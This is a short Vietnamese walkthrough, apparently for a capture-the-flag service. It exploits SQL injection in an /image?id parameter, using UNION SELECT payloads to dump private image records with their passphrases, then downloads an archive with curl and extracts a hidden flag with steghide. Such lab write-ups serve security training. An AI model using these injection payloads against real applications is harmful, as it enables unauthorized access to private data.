# Hướng Tấn Công

## 1. Tìm SQL Injection

Endpoint cần chú ý:

```text
/image?id=1
```

Thử payload:

```text
/image?id=1'
```

Nếu service trả SQL error hoặc phản hồi bất thường, khả năng cao tham số `id` đang được nối trực tiếp vào câu SQL.

## 2. Xác Định Số Cột

Thử `UNION SELECT` với 3 cột:

```text
/image?id=-1' UNION SELECT 'a','b','c'--
```

Trang render được 3 trường tương ứng với:

```text
title, filename, description
```

## 3. Dump Record Private

Đọc các ảnh không public:

```text
/image?id=-1' UNION SELECT title,filename,description FROM images WHERE is_public=0--
```

Response sẽ lộ thông tin dạng:

```text
archive_<flag_id>_<random>.jpg
passphrase: <passphrase>
```

## 4. Tải Ảnh Archive

```bash
curl -o archive.jpg "http://target:8084/download?file=<filename>"
```

## 5. Extract Flag

Cài `steghide` nếu chưa có:

```bash
sudo apt install steghide
```

Extract:

```bash
steghide extract -sf archive.jpg -p "<passphrase>"
cat flag.txt
```

Kết quả là flag động do checker đặt trong round hiện tại.
